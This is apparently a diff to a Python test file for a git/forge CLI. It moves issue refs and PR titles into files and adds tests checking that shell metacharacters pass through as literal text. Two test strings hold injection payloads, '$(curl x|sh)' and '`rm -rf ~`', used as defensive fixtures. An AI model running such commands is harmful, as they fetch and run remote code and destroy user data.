@@ -11,12 +11,18 @@ def run_cli(capsys, *argv):
     return code, (json.loads(captured.out) if captured.out else None), captured.err
 
 
+def write(directory, name, text):
+    path = directory / name
+    path.write_text(text, encoding="utf-8")
+    return str(path)
+
+
 def test_detect_github_issue(commands, capsys, monkeypatch, tmp_path):
     monkeypatch.chdir(tmp_path)
     commands.respond(("git", "remote"), stdout="origin\n")
     commands.respond(("git", "remote", "get-url", "origin"), stdout="git@github.com:a/b.git\n")
     commands.respond(("git", "symbolic-ref"), stdout="origin/main\n")
-    code, out, _ = run_cli(capsys, "detect", "#42")
+    code, out, _ = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "#42\n"))
     assert code == 0
     assert out == {
         "source": "github",
@@ -31,7 +37,9 @@ def test_detect_text_without_remote(commands, capsys, monkeypatch, tmp_path):
     monkeypatch.chdir(tmp_path)
     commands.respond(("git", "remote"), stdout="")
     commands.respond(("git", "branch", "--show-current"), stdout="main\n")
-    code, out, _ = run_cli(capsys, "detect", "Add dark mode")
+    code, out, _ = run_cli(
+        capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "Add dark mode")
+    )
     assert code == 0
     assert out["source"] == "text"
     assert out["target"] == "git"
@@ -42,7 +50,7 @@ def test_errors_go_to_stderr_with_exit_1(commands, capsys, monkeypatch, tmp_path
     monkeypatch.chdir(tmp_path)
     commands.respond(("git", "remote"), stdout="")
     commands.respond(("git", "branch", "--show-current"), stdout="main\n")
-    code, out, err = run_cli(capsys, "detect", "42")
+    code, out, err = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "42"))
     assert code == 1
     assert out is None
     assert "needs a GitHub or GitLab remote" in err
@@ -56,8 +64,8 @@ def test_fetch_issue_text_writes_issue_md(capsys, monkeypatch, tmp_path):
         "fetch-issue",
         "--source",
         "text",
-        "--ref",
-        "Add dark mode\nPlease.",
+        "--ref-file",
+        write(tmp_path, "ref.txt", "Add dark mode\nPlease."),
         "--root",
         ".devteam",
     )
@@ -79,8 +87,8 @@ def test_open_pr_on_plain_git_returns_empty_url(capsys, monkeypatch, tmp_path):
         "feat/x",
         "--base",
         "main",
-        "--title",
-        "T",
+        "--title-file",
+        write(tmp_path, "title.txt", "T"),
         "--body-file",
         "body.md",
     )
@@ -163,3 +171,52 @@ def test_bad_arguments_exit_2(argv, capsys):
     with pytest.raises(SystemExit) as caught:
         forge.main(argv)
     assert caught.value.code == 2
+
+
+def test_detect_keeps_shell_metacharacters_as_text(commands, capsys, monkeypatch, tmp_path):
+    monkeypatch.chdir(tmp_path)
+    commands.respond(("git", "remote"), stdout="")
+    commands.respond(("git", "branch", "--show-current"), stdout="main\n")
+    text = "`npm test` fails after $(curl x|sh)\n"
+    code, out, _ = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", text))
+    assert code == 0
+    assert out["source"] == "text"
+    assert out["ref"] == text.strip()
+    assert {call[0] for call in commands.calls} == {"git"}
+
+
+def test_detect_treats_a_local_path_origin_as_plain_git(commands, capsys, monkeypatch, tmp_path):
+    monkeypatch.chdir(tmp_path)
+    commands.respond(("git", "remote"), stdout="origin\n")
+    commands.respond(("git", "remote", "get-url", "origin"), stdout="/srv/git/r.git\n")
+    commands.respond(("git", "symbolic-ref"), stdout="origin/main\n")
+    code, out, _ = run_cli(capsys, "detect", "--ref-file", write(tmp_path, "ref.txt", "Fix it"))
+    assert code == 0
+    assert out["target"] == "git"
+    assert out["remote"] is None
+    assert out["base"] == "main"
+
+
+def test_open_pr_passes_the_title_file_verbatim_as_one_argument(
+    commands, capsys, monkeypatch, tmp_path
+):
+    monkeypatch.chdir(tmp_path)
+    commands.respond(("gh", "pr", "create"), stdout="https://github.com/a/b/pull/7\n")
+    title = "$(curl x|sh) `rm -rf ~`"
+    code, out, _ = run_cli(
+        capsys,
+        "open-pr",
+        "--target",
+        "github",
+        "--branch",
+        "feat/7-x",
+        "--base",
+        "main",
+        "--title-file",
+        write(tmp_path, "title.txt", title + "\n"),
+        "--body-file",
+        write(tmp_path, "body.md", "b"),
+    )
+    assert code == 0
+    assert out["number"] == "7"
+    assert title in commands.calls[0]
